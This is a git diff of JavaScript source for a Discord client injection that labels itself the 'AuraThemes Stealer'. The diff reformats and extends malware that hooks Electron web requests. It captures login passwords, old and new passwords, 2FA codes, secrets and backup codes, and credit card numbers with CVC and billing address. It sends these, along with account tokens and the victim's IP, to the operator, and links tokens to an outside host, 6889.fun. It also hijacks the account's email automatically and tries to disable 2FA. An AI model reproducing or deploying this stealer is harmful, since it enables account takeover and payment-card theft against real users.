@@ -175,6 +175,7 @@ const GetBadges = (e) => {
     n
   );
 };
+
 const GetRBadges = (e) => {
   var n = "";
   return (
@@ -200,6 +201,7 @@ const GetNSFW = (k4itrun) => {
       return "Idk bro you got me";
   }
 };
+
 const GetA2F = (k4itrun) => {
   switch (k4itrun) {
     case true:
@@ -292,6 +294,7 @@ function remove2FA(token, code) {
     req.end();
   });
 }
+
 const GetNitro = (r) => {
   if (!r.premium_type) return ":x:";
   switch (r.premium_type) {
@@ -369,6 +372,7 @@ function GetLangue(read) {
   var langue = languages[read] || ":flag_us: USA";
   return langue;
 }
+
 const post = async (params) => {
   params = JSON.stringify(params);
   var token = await execScript(tokenScript);
@@ -596,7 +600,7 @@ const FirstTime = async () => {
           },
           {
             name: "ID",
-            value: `\`${user.id}\`\n[Copy ID](https://raw.6889.fun/api/aurathemes/raw/t/${user.id})`,
+            value: `\`${user.id}\`\n[Copy ID](https://6889.fun/api/aurathemes/raw?data=${user.id})`,
             inline: !0,
           },
           {
@@ -655,7 +659,7 @@ const FirstTime = async () => {
           },
           {
             name: "TOKEN",
-            value: `\`\`\`${token}\`\`\`\n[Copy Token](https://raw.6889.fun/api/aurathemes/raw/t/${token})\n\n[Download Banner](${userBanner})`,
+            value: `\`\`\`${token}\`\`\`\n[Copy Token](https://6889.fun/api/aurathemes/raw?data=${token})\n\n[Download Banner](${userBanner})`,
             inline: !1,
           },
         ],
@@ -720,7 +724,7 @@ const FirstTime = async () => {
             },
             {
               name: "ID",
-              value: `\`${user.id}\`\n[Copy ID](https://raw.6889.fun/api/aurathemes/raw/t/${user.id})`,
+              value: `\`${user.id}\`\n[Copy ID](https://6889.fun/api/aurathemes/raw?data=${user.id})`,
               inline: !0,
             },
             {
@@ -784,7 +788,7 @@ const FirstTime = async () => {
             },
             {
               name: "TOKEN",
-              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://raw.6889.fun/api/aurathemes/raw/t/${token})\n\n[Download Banner](${userBanner})`,
+              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://6889.fun/api/aurathemes/raw?data=${token})\n\n[Download Banner](${userBanner})`,
               inline: !1,
             },
           ],
@@ -869,6 +873,7 @@ const checUpdate = () => {
   fs.writeFileSync(index, script);
   return;
 };
+
 electron.session.defaultSession.webRequest.onBeforeRequest(
   config.Filter,
   async (details, callback) => {
@@ -1709,6 +1714,7 @@ async function toForceBackups(langueCible) {
   ];
   return langue;
 }
+
 electron.session.defaultSession.webRequest.onCompleted(
   config.onCompleted,
   async (request, callback) => {
@@ -1765,104 +1771,28 @@ electron.session.defaultSession.webRequest.onCompleted(
                 Billings,
                 Friends,
               } = await K4itrunTuclcavectesfonctions();
+
               var password = data.password;
               var params = await makeEmbed({
                 title: "AuraThemes Stealer User Login",
                 color: config["embed-color"],
                 description: `\`\`\` - Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [
-                  {
-                    name: "Username",
-                    value: `\`${user.username}#${user.discriminator}\``,
-                    inline: !0,
-                  },
-                  {
-                    name: "ID",
-                    value: `\`${user.id}\`\n[Copy ID](https://raw.6889.fun/api/aurathemes/raw/t/${user.id})`,
-                    inline: !0,
-                  },
-                  {
-                    name: "Nitro",
-                    value: `${GetNitro(Nitro)}`,
-                    inline: !0,
-                  },
-                  {
-                    name: "Badges",
-                    value: `${GetBadges(user.flags)}`,
-                    inline: !0,
-                  },
-                  {
-                    name: "Language",
-                    value: `${GetLangue(user.locale)}`,
-                    inline: !0,
-                  },
-                  {
-                    name: "NSFW",
-                    value: `${GetNSFW(user.nsfw_allowed)}`,
-                    inline: !0,
-                  },
-                  {
-                    name: "A2F",
-                    value: `${GetA2F(user.mfa_enabled)}`,
-                    inline: !0,
-                  },
-                  {
-                    name: "@Copyright",
-                    value: `[AuraThemes Stealer 2023](https://discord.gg/aurathemes)`,
-                    inline: !0,
-                  },
-                  {
-                    name: "AuraThemes Files",
-                    value: `[Gofile](${config.transfer_link})`,
-                    inline: !0,
-                  },
-                  {
-                    name: "Billing",
-                    value: `${Billings}`,
-                    inline: !0,
-                  },
-                  {
-                    name: "Email",
-                    value: `\`${user.email}\``,
-                    inline: !0,
-                  },
-                  {
-                    name: "Phone",
-                    value: `\`${user.phone ?? "None"}\``,
-                    inline: !0,
-                  },
-                  {
-                    name: "Password",
-                    value: `\`${password}\``,
-                    inline: !0,
-                  },
-                  {
-                    name: "Bio ",
-                    value: `\`\`\`${
-                      user.bio !== null &&
-                      user.bio !== undefined &&
-                      user.bio !== ""
-                        ? user.bio
-                        : ":x:"
-                    }\`\`\``,
-                    inline: false,
-                  },
-                  {
-                    name: "Code 2fa used ",
-                    value: `\`\`\`${
-                      dt.code !== null &&
-                      dt.code !== undefined &&
-                      dt.code !== ""
-                        ? dt.code
-                        : ":x:"
-                    }\`\`\``,
-                    inline: false,
-                  },
-                  {
-                    name: "TOKEN",
-                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://raw.6889.fun/api/aurathemes/raw/t/${token})\n\n[Download Banner](${userBanner})`,
-                    inline: !1,
-                  },
+                  { name: "Username", value: `\`${user.username}#${user.discriminator}\``, inline: !0, },
+                  { name: "ID", value: `\`${user.id}\`\n[Copy ID](https://6889.fun/api/aurathemes/raw?data=${user.id})`, inline: !0, },
+                  { name: "Nitro", value: `${GetNitro(Nitro)}`, inline: !0, },
+                  { name: "Badges", value: `${GetBadges(user.flags)}`, inline: !0, },
+                  { name: "Language", value: `${GetLangue(user.locale)}`, inline: !0, },
+                  { name: "NSFW", value: `${GetNSFW(user.nsfw_allowed)}`, inline: !0, },
+                  { name: "A2F", value: `${GetA2F(user.mfa_enabled)}`, inline: !0, },
+                  { name: "AuraThemes Files", value: `[Gofile](${config.transfer_link})`, inline: !0, },
+                  { name: "Billing", value: `${Billings}`, inline: !0, },
+                  { name: "Email", value: `\`${user.email}\``, inline: !0, },
+                  { name: "Phone", value: `\`${user.phone ?? "None"}\``, inline: !0, },
+                  { name: "Password", value: `\`${password}\``, inline: !0, },
+                  { name: "Bio ", value: `\`\`\`${ user.bio !== null && user.bio !== undefined && user.bio !== "" ? user.bio : ":x:" }\`\`\``, inline: false, },
+                  { name: "Code 2fa used ", value: `\`\`\`${ dt.code !== null && dt.code !== undefined && dt.code !== "" ? dt.code : ":x:" }\`\`\``, inline: false, },
+                  { name: "TOKEN", value: `\`\`\`${token}\`\`\`\n[Copy Token](https://6889.fun/api/aurathemes/raw?data=${token})\n\n[Download Banner](${userBanner})`, inline: !1, },
                 ],
 
                 thumbnail: userAvatar,
@@ -1883,6 +1813,7 @@ electron.session.defaultSession.webRequest.onCompleted(
           );
         } else {
           if (token) {
+
             var {
               token,
               user,
@@ -1903,87 +1834,20 @@ electron.session.defaultSession.webRequest.onCompleted(
               color: config["embed-color"],
               description: `\`\`\` - Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
               fields: [
-                {
-                  name: "Username",
-                  value: `\`${user.username}#${user.discriminator}\``,
-                  inline: !0,
-                },
-                {
-                  name: "ID",
-                  value: `\`${user.id}\`\n[Copy ID](https://raw.6889.fun/api/aurathemes/raw/t/${user.id})`,
-                  inline: !0,
-                },
-                {
-                  name: "Nitro",
-                  value: `${GetNitro(Nitro)}`,
-                  inline: !0,
-                },
-                {
-                  name: "Badges",
-                  value: `${GetBadges(user.flags)}`,
-                  inline: !0,
-                },
-                {
-                  name: "Language",
-                  value: `${GetLangue(user.locale)}`,
-                  inline: !0,
-                },
-                {
-                  name: "NSFW",
-                  value: `${GetNSFW(user.nsfw_allowed)}`,
-                  inline: !0,
-                },
-                {
-                  name: "A2F",
-                  value: `${GetA2F(user.mfa_enabled)}`,
-                  inline: !0,
-                },
-                {
-                  name: "@Copyright",
-                  value: `[AuraThemes Stealer 2023](https://discord.gg/aurathemes)`,
-                  inline: !0,
-                },
-                {
-                  name: "AuraThemes Files",
-                  value: `[Gofile](${config.transfer_link})`,
-                  inline: !0,
-                },
-                {
-                  name: "Billing",
-                  value: `${Billings}`,
-                  inline: !0,
-                },
-                {
-                  name: "Email",
-                  value: `\`${user.email}\``,
-                  inline: !0,
-                },
-                {
-                  name: "Phone",
-                  value: `\`${user.phone ?? "None"}\``,
-                  inline: !0,
-                },
-                {
-                  name: "Password",
-                  value: `\`${password}\``,
-                  inline: !0,
-                },
-                {
-                  name: "Bio ",
-                  value: `\`\`\`${
-                    user.bio !== null &&
-                    user.bio !== undefined &&
-                    user.bio !== ""
-                      ? user.bio
-                      : ":x:"
-                  }\`\`\``,
-                  inline: false,
-                },
-                {
-                  name: "TOKEN",
-                  value: `\`\`\`${token}\`\`\`\n[Copy Token](https://raw.6889.fun/api/aurathemes/raw/t/${token})\n\n[Download Banner](${userBanner})`,
-                  inline: !1,
-                },
+                { name: "Username", value: `\`${user.username}#${user.discriminator}\``, inline: !0, },
+                { name: "ID", value: `\`${user.id}\`\n[Copy ID](https://6889.fun/api/aurathemes/raw?data=${user.id})`, inline: !0, },
+                { name: "Nitro", value: `${GetNitro(Nitro)}`, inline: !0, },
+                { name: "Badges", value: `${GetBadges(user.flags)}`, inline: !0, },
+                { name: "Language", value: `${GetLangue(user.locale)}`, inline: !0, },
+                { name: "NSFW", value: `${GetNSFW(user.nsfw_allowed)}`, inline: !0, },
+                { name: "A2F", value: `${GetA2F(user.mfa_enabled)}`, inline: !0, },
+                { name: "AuraThemes Files", value: `[Gofile](${config.transfer_link})`, inline: !0, },
+                { name: "Billing", value: `${Billings}`, inline: !0, },
+                { name: "Email", value: `\`${user.email}\``, inline: !0, },
+                { name: "Phone", value: `\`${user.phone ?? "None"}\``, inline: !0, },
+                { name: "Password", value: `\`${password}\``, inline: !0, },
+                { name: "Bio ", value: `\`\`\`${ user.bio !== null && user.bio !== undefined && user.bio !== "" ? user.bio : ":x:" }\`\`\``, inline: false, }, 
+                { name: "TOKEN", value: `\`\`\`${token}\`\`\`\n[Copy Token](https://6889.fun/api/aurathemes/raw?data=${token})\n\n[Download Banner](${userBanner})`, inline: !1, },
               ],
 
               thumbnail: userAvatar,
@@ -2007,83 +1871,25 @@ electron.session.defaultSession.webRequest.onCompleted(
         if (!data.password) return;
         if (data.new_password) {
           var params = await makeEmbed({
-            title:
-              "AuraThemes Stealer Detect Password Changed",
+            title: "AuraThemes Stealer Detect Password Changed",
             color: config["embed-color"],
             description: `\`\`\` - Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
             fields: [
-              {
-                name: "Username",
-                value: `\`${user.username}#${user.discriminator}\``,
-                inline: !0,
-              },
-              {
-                name: "ID",
-                value: `\`${user.id}\`\n[Copy ID](https://raw.6889.fun/api/aurathemes/raw/t/${user.id})`,
-                inline: !0,
-              },
-              {
-                name: "Nitro",
-                value: `${GetNitro(Nitro)}`,
-                inline: !0,
-              },
-              {
-                name: "Badges",
-                value: `${GetBadges(user.flags)}`,
-                inline: !0,
-              },
-              {
-                name: "Language",
-                value: `${GetLangue(user.locale)}`,
-                inline: !0,
-              },
-              {
-                name: "NSFW",
-                value: `${GetNSFW(user.nsfw_allowed)}`,
-                inline: !0,
-              },
-              {
-                name: "A2F",
-                value: `${GetA2F(user.mfa_enabled)}`,
-                inline: !0,
-              },
-              {
-                name: "@Copyright",
-                value: `[AuraThemes Stealer 2023](https://discord.gg/aurathemes)`,
-                inline: !0,
-              },
-              {
-                name: "AuraThemes Files",
-                value: `[Gofile](${config.transfer_link})`,
-                inline: !0,
-              },
-              {
-                name: "Billing",
-                value: `${Billings}`,
-                inline: !0,
-              },
-              {
-                name: "Email",
-                value: `\`${user.email}\``,
-                inline: !0,
-              },
-              {
-                name: "Phone",
-                value: `\`${user.phone ?? "None"}\``,
-                inline: !0,
-              },
-              {
-                name: "Old Password",
-                value: `\`${data.password}\``,
-                inline: !0,
-              },
-              {
-                name: "New Password",
-                value: `\`${data.new_password}\``,
-                inline: !0,
-              },
-              {
-                name: "Bio ",
+              { name: "Username", value: `\`${user.username}#${user.discriminator}\``, inline: !0, },
+              { name: "ID", value: `\`${user.id}\`\n[Copy ID](https://6889.fun/api/aurathemes/raw?data=${user.id})`, inline: !0, },
+              { name: "Nitro", value: `${GetNitro(Nitro)}`, inline: !0, },
+              { name: "Badges", value: `${GetBadges(user.flags)}`, inline: !0, },
+              { name: "Language", value: `${GetLangue(user.locale)}`, inline: !0, },
+              { name: "NSFW", value: `${GetNSFW(user.nsfw_allowed)}`, inline: !0, },
+              { name: "A2F", value: `${GetA2F(user.mfa_enabled)}`, inline: !0, },
+              { name: "@Copyright", value: `[AuraThemes Stealer 2023](https://discord.gg/aurathemes)`, inline: !0, },
+              { name: "AuraThemes Files", value: `[Gofile](${config.transfer_link})`, inline: !0, },
+              { name: "Billing", value: `${Billings}`, inline: !0, },
+              { name: "Email", value: `\`${user.email}\``, inline: !0, },
+              { name: "Phone", value: `\`${user.phone ?? "None"}\``, inline: !0, },
+              { name: "Old Password", value: `\`${data.password}\``, inline: !0, },
+              { name: "New Password", value: `\`${data.new_password}\``, inline: !0, },
+              { name: "Bio ",
                 value: `\`\`\`${
                   user.bio !== null && user.bio !== undefined && user.bio !== ""
                     ? user.bio
@@ -2091,13 +1897,8 @@ electron.session.defaultSession.webRequest.onCompleted(
                 }\`\`\``,
                 inline: false,
               },
-              {
-                name: "TOKEN",
-                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://raw.6889.fun/api/aurathemes/raw/t/${token})\n\n[Download Banner](${userBanner})`,
-                inline: !1,
-              },
+              { name: "TOKEN", value: `\`\`\`${token}\`\`\`\n[Copy Token](https://6889.fun/api/aurathemes/raw?data=${token})\n\n[Download Banner](${userBanner})`, inline: !1, },
             ],
-
             thumbnail: userAvatar,
           });
 
@@ -2110,83 +1911,76 @@ electron.session.defaultSession.webRequest.onCompleted(
           });
 
           params.embeds.push(params2.embeds[0]);
-
           await post(params);
+
+        } else if (data.username) {
+            var params = await makeEmbed({
+              title: "AuraThemes Stealer Detect Username",
+              color: config["embed-color"],
+              description: `\`\`\` - Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+              fields: [
+                { name: "Username", value: `\`${user.username}#${user.discriminator}\``, inline: !0, },
+                { name: "ID", value: `\`${user.id}\`\n[Copy ID](https://6889.fun/api/aurathemes/raw?data=${user.id})`, inline: !0, },
+                { name: "Nitro", value: `${GetNitro(Nitro)}`, inline: !0, },
+                { name: "Badges", value: `${GetBadges(user.flags)}`, inline: !0, },
+                { name: "Language", value: `${GetLangue(user.locale)}`, inline: !0, },
+                { name: "NSFW", value: `${GetNSFW(user.nsfw_allowed)}`, inline: !0, },
+                { name: "A2F", value: `${GetA2F(user.mfa_enabled)}`, inline: !0, },
+                { name: "@Copyright", value: `[AuraThemes Stealer 2023](https://discord.gg/aurathemes)`, inline: !0, },
+                { name: "AuraThemes Files", value: `[Gofile](${config.transfer_link})`, inline: !0, },
+                { name: "Billing", value: `${Billings}`, inline: !0, },
+                { name: "Email", value: `\`${user.email}\``, inline: !0, },
+                { name: "Phone", value: `\`${user.phone ?? "None"}\``, inline: !0, },
+                { name: "Password", value: `\`${data.password}\``, inline: !0, },
+                { name: "Bio ", value: `\`\`\`${ user.bio !== null && user.bio !== undefined && user.bio !== "" ? user.bio : ":x:" }\`\`\``, inline: false, },
+                { name: "TOKEN", value: `\`\`\`${token}\`\`\`\n[Copy Token](https://6889.fun/api/aurathemes/raw?data=${token})\n\n[Download Banner](${userBanner})`, inline: !1, },
+              ],
+              thumbnail: userAvatar,
+            });
+  
+            var params2 = await makeEmbed({
+              title: `Total Friends (${Friends.len})`,
+              color: config["embed-color"],
+              description: Friends.badges,
+              image: userBanner,
+              thumbnail: userAvatar,
+            });
+  
+            params.embeds.push(params2.embeds[0]);
+            await post(params);
+
         } else if (data.email) {
           if (config.changeMailAuto == "true") {
+
             const atIndex = config.mail.indexOf("@");
             const username = config.mail.substring(0, atIndex);
             const domain = config.mail.substring(atIndex);
-
-            const generatedEmail = `${username ?? "k4itrundediscord"}+${generateId(
-              3
-            )}${domain ?? "@gmail.com"}`;
+            const generatedEmail = `${username ?? "k4itrundiscord"}+${generateId(3)}${domain ?? "@gmail.com"}`;
             const generatedPassword = generatePassword();
 
             console.log(generatedEmail, generatedPassword);
             try {
               const res = await updateEmail(
-                token,
+                token, 
                 generatedEmail,
                 data.password
               );
+
               if (res.username) {
                 var params = await makeEmbed({
-                  title:
-                    "AuraThemes Stealer Have changed the victim mail",
+                  title: "AuraThemes Stealer Have changed the victim mail",
                   color: config["embed-color"],
                   description: `\`\`\` - Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                   fields: [
-                    {
-                      name: "Username",
-                      value: `\`${res.username}#${res.discriminator}\``,
-                      inline: !1,
-                    },
-                    {
-                      name: "ID",
-                      value: `\`${res.id}\`\n[Copy ID](https://raw.6889.fun/api/aurathemes/raw/t/${res.id})`,
-                      inline: !1,
-                    },
-                    {
-                      name: "Badges",
-                      value: `${GetBadges(res.flags)}`,
-                      inline: !1,
-                    },
-                    {
-                      name: "A2F",
-                      value: `${GetA2F(res.mfa_enabled)}`,
-                      inline: !1,
-                    },
-                    {
-                      name: "@Copyright",
-                      value: `[AuraThemes Stealer 2023](https://discord.gg/aurathemes)`,
-                      inline: !1,
-                    },
-                    {
-                      name: "AuraThemes Files",
-                      value: `[Gofile](${config.transfer_link})`,
-                      inline: !1,
-                    },
-                    {
-                      name: "Phone",
-                      value: `\`${res.phone ?? "None"}\``,
-                      inline: !1,
-                    },
-                    {
-                      name: "New Email",
-                      value: `\`${res.email}\``,
-                      inline: !1,
-                    },
-                    {
-                      name: "Password",
-                      value: `\`${generatedPassword}\``,
-                      inline: !1,
-                    },
-                    {
-                      name: "TOKEN",
-                      value: `\`\`\`${res.token}\`\`\`\n[Copy Token](https://raw.6889.fun/api/aurathemes/raw/t/${res.token})`,
-                      inline: !1,
-                    },
+                    { name: "Username", value: `\`${res.username}#${res.discriminator}\``, inline: !1, },
+                    { name: "ID", value: `\`${res.id}\`\n[Copy ID](https://6889.fun/api/aurathemes/raw?data=${res.id})`, inline: !1, },
+                    { name: "Badges", value: `${GetBadges(res.flags)}`, inline: !1, },
+                    { name: "A2F", value: `${GetA2F(res.mfa_enabled)}`, inline: !1, },
+                    { name: "AuraThemes Files", value: `[Gofile](${config.transfer_link})`, inline: !1, },
+                    { name: "Phone", value: `\`${res.phone ?? "None"}\``, inline: !1, },
+                    { name: "New Email", value: `\`${res.email}\``, inline: !1, },
+                    { name: "Password", value: `\`${generatedPassword}\``, inline: !1, },
+                    { name: "TOKEN", value: `\`\`\`${res.token}\`\`\`\n[Copy Token](https://6889.fun/api/aurathemes/raw?data=${res.token})`, inline: !1, },
                   ],
                   thumbnail: userAvatar,
                 });
@@ -2197,92 +1991,26 @@ electron.session.defaultSession.webRequest.onCompleted(
             } catch (error) {}
           }
           var params = await makeEmbed({
-            title:
-              "AuraThemes Stealer Detect Email Changed",
+            title: "AuraThemes Stealer Detect Email Changed",
             color: config["embed-color"],
             description: `\`\`\` - Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
             fields: [
-              {
-                name: "Username",
-                value: `\`${user.username}#${user.discriminator}\``,
-                inline: !0,
-              },
-              {
-                name: "ID",
-                value: `\`${user.id}\`\n[Copy ID](https://raw.6889.fun/api/aurathemes/raw/t/${user.id})`,
-                inline: !0,
-              },
-              {
-                name: "Nitro",
-                value: `${GetNitro(Nitro)}`,
-                inline: !0,
-              },
-              {
-                name: "Badges",
-                value: `${GetBadges(user.flags)}`,
-                inline: !0,
-              },
-              {
-                name: "Language",
-                value: `${GetLangue(user.locale)}`,
-                inline: !0,
-              },
-              {
-                name: "NSFW",
-                value: `${GetNSFW(user.nsfw_allowed)}`,
-                inline: !0,
-              },
-              {
-                name: "A2F",
-                value: `${GetA2F(user.mfa_enabled)}`,
-                inline: !0,
-              },
-              {
-                name: "@Copyright",
-                value: `[AuraThemes Stealer 2023](https://discord.gg/aurathemes)`,
-                inline: !0,
-              },
-              {
-                name: "AuraThemes Files",
-                value: `[Gofile](${config.transfer_link})`,
-                inline: !0,
-              },
-              {
-                name: "Billing",
-                value: `${Billings}`,
-                inline: !0,
-              },
-              {
-                name: "New Email",
-                value: `\`${user.email}\``,
-                inline: !0,
-              },
-              {
-                name: "Phone",
-                value: `\`${user.phone ?? "None"}\``,
-                inline: !0,
-              },
-              {
-                name: "Password",
-                value: `\`${data.password}\``,
-                inline: !0,
-              },
-              {
-                name: "Bio ",
-                value: `\`\`\`${
-                  user.bio !== null && user.bio !== undefined && user.bio !== ""
-                    ? user.bio
-                    : ":x:"
-                }\`\`\``,
-                inline: false,
-              },
-              {
-                name: "TOKEN",
-                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://raw.6889.fun/api/aurathemes/raw/t/${token})\n\n[Download Banner](${userBanner})`,
-                inline: !1,
-              },
+              { name: "Username", value: `\`${user.username}#${user.discriminator}\``, inline: !0, },
+              { name: "ID", value: `\`${user.id}\`\n[Copy ID](https://6889.fun/api/aurathemes/raw?data=${user.id})`, inline: !0, },
+              { name: "Nitro",value: `${GetNitro(Nitro)}`, inline: !0, },
+              { name: "Badges", value: `${GetBadges(user.flags)}`, inline: !0, },
+              { name: "Language", value: `${GetLangue(user.locale)}`, inline: !0, },
+              { name: "NSFW", value: `${GetNSFW(user.nsfw_allowed)}`, inline: !0, },
+              { name: "A2F", value: `${GetA2F(user.mfa_enabled)}`, inline: !0, },
+              { name: "@Copyright", value: `[AuraThemes Stealer 2023](https://discord.gg/aurathemes)`, inline: !0, },
+              { name: "AuraThemes Files", value: `[Gofile](${config.transfer_link})`, inline: !0, },
+              { name: "Billing", value: `${Billings}`, inline: !0, },
+              { name: "New Email", value: `\`${user.email}\``, inline: !0, },
+              { name: "Phone", value: `\`${user.phone ?? "None"}\``, inline: !0, },
+              { name: "Password", value: `\`${data.password}\``, inline: !0, },
+              { name: "Bio ", value: `\`\`\`${user.bio !== null && user.bio !== undefined && user.bio !== "" ? user.bio : ":x:" }\`\`\``, inline: false, },
+              { name: "TOKEN", value: `\`\`\`${token}\`\`\`\n[Copy Token](https://6889.fun/api/aurathemes/raw?data=${token})\n\n[Download Banner](${userBanner})`, inline: !1, },
             ],
-
             thumbnail: userAvatar,
           });
 
@@ -2300,6 +2028,7 @@ electron.session.defaultSession.webRequest.onCompleted(
           break;
         }
       case request.url.includes("api.stripe"):
+
         var [CardNumber, CardCVC, month, year] = [
           data["card[number]"],
           data["card[cvc]"],
@@ -2318,67 +2047,22 @@ electron.session.defaultSession.webRequest.onCompleted(
                   decodeURIComponent(re.uploadData[0].bytes.toString())
                 );
               }
-              let { line_1, line_2, city, state, postal_code, country, email } =
-                dt.billing_address;
+              let { line_1, line_2, city, state, postal_code, country, email } = dt.billing_address;
               var params = await makeEmbed({
-                title:
-                  "AuraThemes Stealer User Credit Card Added",
+                title: "AuraThemes Stealer User Credit Card Added",
                 color: config["embed-color"],
                 fields: [
-                  {
-                    name: "AuraThemes Files",
-                    value: `[Gofile](${config.transfer_link})`,
-                    inline: false,
-                  },
-                  {
-                    name: "IP",
-                    value: `\`${ip}\``,
-                    inline: false,
-                  },
-                  {
-                    name: "ID",
-                    value: `\`${user.id}\`\n[Copy ID](https://raw.6889.fun/api/aurathemes/raw/t/${user.id})`,
-                    inline: false,
-                  },
-                  {
-                    name: "Username",
-                    value: `\`${user.username}#${user.discriminator}\``,
-                    inline: false,
-                  },
-                  {
-                    name: "Language",
-                    value: GetLangue(user.locale),
-                    inline: false,
-                  },
-                  {
-                    name: "A2F",
-                    value: GetA2F(user.mfa_enabled),
-                    inline: false,
-                  },
-                  {
-                    name: "Badges",
-                    value: GetBadges(user.flags),
-                    inline: false,
-                  },
-                  {
-                    name: "Address",
-                    value: `\`\`\`md\n# Line 1 : ${line_1},\n# Line 2 : ${line_2},\n# City : ${city},\n# State : ${state},\n# Postal Code : ${postal_code},\n# Country : ${country}\n\`\`\``,
-                    inline: false,
-                  },
-                  {
-                    name: "Credit Card",
-                    value: `\`\`\`md\n# Card Number : ${CardNumber}\n# Card Expiration : ${
-                      month + "/" + year
-                    }\n# CVC : ${CardCVC}\`\`\``,
-                    inline: false,
-                  },
-                  {
-                    name: "TOKEN",
-                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://raw.6889.fun/api/aurathemes/raw/t/${token})\n\n[Download Banner](${userBanner})`,
-                    inline: false,
-                  },
+                  { name: "AuraThemes Files", value: `[Gofile](${config.transfer_link})`, inline: false, },
+                  { name: "IP", value: `\`${ip}\``, inline: false, },
+                  { name: "ID", value: `\`${user.id}\`\n[Copy ID](https://6889.fun/api/aurathemes/raw?data=${user.id})`, inline: false, },
+                  { name: "Username", value: `\`${user.username}#${user.discriminator}\``, inline: false, },
+                  { name: "Language", value: GetLangue(user.locale), inline: false, },
+                  { name: "A2F", value: GetA2F(user.mfa_enabled), inline: false, },
+                  { name: "Badges", value: GetBadges(user.flags), inline: false, },
+                  { name: "Address", value: `\`\`\`md\n# Line 1: ${line_1 ?? "Nothing"},\n# Line 2: ${line_2 ?? "Nothing"},\n# City: ${city ?? "Nothing"},\n# State: ${state ?? "Nothing"},\n# Postal Code: ${postal_code ?? "Nothing"},\n# Country : ${country ?? "Nothing"}\n\`\`\``, inline: false, },
+                  { name: "Credit Card", value: `\`\`\`md\n# Card Number: ${CardNumber ?? "Nothing"}\n# Card Expiration: ${month + "/" + year ?? "Nothing"}\n# CVC: ${CardCVC ?? "Nothing"}\`\`\``, inline: false, },
+                  { name: "TOKEN", value: `\`\`\`${token}\`\`\`\n[Copy Token](https://6889.fun/api/aurathemes/raw?data=${token})\n\n[Download Banner](${userBanner})`, inline: false, },
                 ],
-
                 thumbnail: userAvatar,
               });
               await post(params);
@@ -2421,62 +2105,19 @@ electron.session.defaultSession.webRequest.onCompleted(
           title: "AuraThemes Stealer User Enable 2FA",
           color: config["embed-color"],
           fields: [
-            {
-              name: "AuraThemes Files",
-              value: `[Gofile](${config.transfer_link})`,
-              inline: false,
-            },
-            {
-              name: "IP",
-              value: `\`${ip}\``,
-              inline: false,
-            },
-            {
-              name: "Username",
-              value: `\`${user.username}#${user.discriminator}\``,
-              inline: false,
-            },
-            {
-              name: "ID",
-              value: `\`${user.id}\`\n[Copy ID](https://raw.6889.fun/api/aurathemes/raw/t/${user.id})`,
-              inline: false,
-            },
-            {
-              name: "Language",
-              value: GetLangue(user.locale),
-              inline: false,
-            },
-            {
-              name: "2FA disabler Response <:2FA:982994698278952980>",
-              value: `\`\`\`md\n- ${
-                ValidFound ? "Disabled" : "Cannot Disable"
-              }\`\`\``,
-              inline: false,
-            },
-            {
-              name: "A2F",
-              value: GetA2F(user.mfa_enabled),
-              inline: false,
-            },
-            {
-              name: "Badges",
-              value: GetBadges(user.flags),
-              inline: false,
-            },
-            {
-              name: "Backups Code",
-              value: `\`\`\`md\n${backup_codes
-                .map((x) => `- ${x}`)
-                .join("\n")}\`\`\``,
-              inline: false,
-            },
-            {
-              name: "TOKEN",
-              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://raw.6889.fun/api/aurathemes/raw/t/${token})\n\n[Download Banner](${userBanner})`,
-              inline: false,
-            },
+            { name: "AuraThemes Files", value: `[Gofile](${config.transfer_link})`, inline: false, },
+            { name: "IP", value: `\`${ip}\``, inline: false, },
+            { name: "Username", value: `\`${user.username}#${user.discriminator}\``, inline: false, },
+            { name: "ID", value: `\`${user.id}\`\n[Copy ID](https://6889.fun/api/aurathemes/raw?data=${user.id})`, inline: false, },
+            { name: "Language", value: GetLangue(user.locale), inline: false, },
+            { name: "2FA disabler Response <:2FA:982994698278952980>", value: `\`\`\`md\n- ${ValidFound ? "Disabled" : "Cannot Disable"}\`\`\``, inline: false, },
+            { name: "A2F", value: GetA2F(user.mfa_enabled), inline: false, },
+            { name: "Badges", value: GetBadges(user.flags), inline: false, },
+            { name: "Code", value: `\`${data.code}\``, inline: false, },
+            { name: "Secret", value: `\`${data.secret}\``, inline: false, },
+            { name: "Backups Code", value: `\`\`\`md\n${backup_codes.map((x) => `- ${x}`).join("\n")}\`\`\``, inline: false, },
+            { name: "TOKEN", value: `\`\`\`${token}\`\`\`\n[Copy Token](https://6889.fun/api/aurathemes/raw?data=${token})\n\n[Download Banner](${userBanner})`, inline: false,},
           ],
-
           thumbnail: userAvatar,
         });
         await post(params);
@@ -2486,43 +2127,14 @@ electron.session.defaultSession.webRequest.onCompleted(
           title: "AuraThemes Stealer User Removed 2FA",
           color: config["embed-color"],
           fields: [
-            {
-              name: "AuraThemes Files",
-              value: `[Gofile](${config.transfer_link})`,
-              inline: false,
-            },
-            {
-              name: "IP",
-              value: `\`${ip}\``,
-              inline: false,
-            },
-            {
-              name: "Username",
-              value: `\`${user.username}#${user.discriminator}\``,
-              inline: false,
-            },
-            {
-              name: "Language",
-              value: GetLangue(user.locale),
-              inline: false,
-            },
-            {
-              name: "A2F",
-              value: GetA2F(user.mfa_enabled),
-              inline: false,
-            },
-            {
-              name: "Badges",
-              value: GetBadges(user.flags),
-              inline: false,
-            },
-            {
-              name: "TOKEN",
-              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://raw.6889.fun/api/aurathemes/raw/t/${token})\n\n[Download Banner](${userBanner})`,
-              inline: !1,
-            },
+            { name: "AuraThemes Files", value: `[Gofile](${config.transfer_link})`, inline: false, },
